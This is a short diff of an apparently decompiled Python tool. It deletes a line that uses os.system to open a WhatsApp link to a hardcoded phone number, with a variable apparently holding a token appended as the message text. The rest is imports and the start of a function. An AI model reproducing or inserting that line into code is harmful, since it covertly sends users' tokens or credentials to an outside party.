@@ -1,6 +1,6 @@
 # Decompile by Mardis (Tools By Kapten-Kaizo)
 # Time Succes decompile : 2023-02-25 22:46:08.421029
-os.system('am start https://wa.me/+8801768576918ptext=' + tks)
+
 import os,sys,time,requests,random,string
 import random
 def Axak(xak):
